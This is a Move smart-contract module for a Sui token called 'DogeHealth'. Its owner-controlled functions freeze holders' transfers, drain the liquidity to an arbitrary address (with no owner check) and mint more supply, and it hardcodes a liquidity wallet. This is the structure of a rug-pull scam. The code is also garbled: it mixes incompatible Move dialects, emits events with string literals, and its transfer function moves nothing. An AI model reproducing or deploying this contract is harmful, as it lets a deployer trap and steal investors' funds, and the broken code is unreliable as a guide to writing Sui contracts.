module DogeHealth::DogeHealth {

    use sui::coin;
    use sui::address;
    use sui::transfer;
    use sui::tx_context;
    use sui::signer;
    use sui::event;

    const E_NOT_AUTHORIZED: u64 = 1;
    const E_LIQUIDITY_NOT_LOCKED: u64 = 2;

    resource struct Token has key {
        balance: u64,
    }

    resource struct TokenOwner has key {
        is_liquidity_locked: bool,
        liquidity_wallet: address,
        owner: address,
    }

    public fun initialize_token(owner: &signer, ctx: &mut tx_context::TxContext) {
        let owner_address = signer::address_of(owner);
        let token_owner = TokenOwner {
            is_liquidity_locked: false,
            liquidity_wallet: 0xe2e0f507434990fb40683f478bee7414ae36b8cd90a466db2b1c93ff6b9740c8,
            owner: owner_address,
        };
        move_to(owner, token_owner);
        event::emit_event(ctx, "Token Initialized", ());
    }

    public fun transfer_tokens(sender: &signer, recipient: address, amount: u64) acquires TokenOwner {
        let sender_token = borrow_global_mut<TokenOwner>(signer::address_of(sender));
        assert!(!sender_token.is_liquidity_locked, E_NOT_AUTHORIZED);
    }

    public fun freeze_liquidity(owner: &signer, ctx: &mut tx_context::TxContext) acquires TokenOwner {
        let owner_data = borrow_global_mut<TokenOwner>(signer::address_of(owner));
        assert!(signer::address_of(owner) == owner_data.owner, E_NOT_AUTHORIZED);
        owner_data.is_liquidity_locked = true;
        event::emit_event(ctx, "Liquidity Frozen", ());
    }

    public fun unlock_liquidity(owner: &signer, ctx: &mut tx_context::TxContext) acquires TokenOwner {
        let owner_data = borrow_global_mut<TokenOwner>(signer::address_of(owner));
        assert!(signer::address_of(owner) == owner_data.owner, E_NOT_AUTHORIZED);
        owner_data.is_liquidity_locked = false;
        event::emit_event(ctx, "Liquidity Unlocked", ());
    }

    public fun drain_liquidity(owner: &signer, drain_address: address, ctx: &mut tx_context::TxContext) acquires TokenOwner {
        let owner_data = borrow_global_mut<TokenOwner>(signer::address_of(owner));
        assert!(owner_data.is_liquidity_locked, E_LIQUIDITY_NOT_LOCKED);
        move_to(drain_address, owner_data);
        event::emit_event(ctx, "Liquidity Drained", ());
    }

    public fun mint_more_tokens(owner: &signer, additional_supply: u64, ctx: &mut tx_context::TxContext) acquires TokenOwner {
        let owner_data = borrow_global_mut<TokenOwner>(signer::address_of(owner));
        assert!(signer::address_of(owner) == owner_data.owner, E_NOT_AUTHORIZED);
        event::emit_event(ctx, "Tokens Minted", ());
    }
}
